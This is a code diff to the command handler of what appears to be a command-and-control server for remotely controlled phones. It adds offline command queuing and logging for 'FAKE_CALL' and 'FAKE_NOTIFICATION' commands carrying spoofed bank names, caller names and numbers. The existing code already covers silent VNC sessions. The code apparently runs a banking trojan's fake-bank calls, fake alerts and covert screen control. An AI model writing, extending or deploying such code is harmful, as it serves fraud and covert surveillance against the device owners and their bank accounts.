@@ -74,11 +74,27 @@ function _handleMsg(ws, msg) {
     case 'command': {
       const { device_id, action, ...params } = msg;
       if (!device_id || !action) return;
-      const sent = state.sendToDevice(device_id, { action, ...params });
+
+      // Try send; if device offline, queue for later delivery
+      const { sent, queued } = state.queueOrSend(device_id, { action, ...params });
+
       q.insertCmd.run(device_id, action, JSON.stringify(params), sent ? 1 : 0, now);
       _optimisticUpdate(device_id, action, params);
-      ws.send(JSON.stringify({ type: 'command_ack', device_id, action, sent, ts: now }));
-      state.broadcastAll({ type: 'command_issued', device_id, action, params, sent, ts: now });
+
+      // Log special commands to dedicated tables
+      if (action === 'FAKE_CALL') {
+        q.insertFakeCall.run(device_id,
+          params.caller_name || '', params.caller_number || '',
+          params.bank || '', 'sent', now);
+      }
+      if (action === 'FAKE_NOTIFICATION') {
+        q.insertNotif.run(device_id,
+          params.title || '', params.message || params.text || '',
+          params.bank || '', params.isCall ? 1 : 0, 'sent', now);
+      }
+
+      ws.send(JSON.stringify({ type: 'command_ack', device_id, action, sent, queued, ts: now }));
+      state.broadcastAll({ type: 'command_issued', device_id, action, params, sent, queued, ts: now });
       break;
     }
 
@@ -106,7 +122,7 @@ function _optimisticUpdate(deviceId, action, params) {
       case 'START_SILENT_VNC':     setField('vnc_active',           deviceId, 1); break;
       case 'STOP_SILENT_VNC':      setField('vnc_active',           deviceId, 0); break;
     }
-  } catch(e) { /* non-fatal — device row might not exist yet */ }
+  } catch(_) { /* device row might not exist yet — non-fatal */ }
 }
 
 module.exports = { handle };
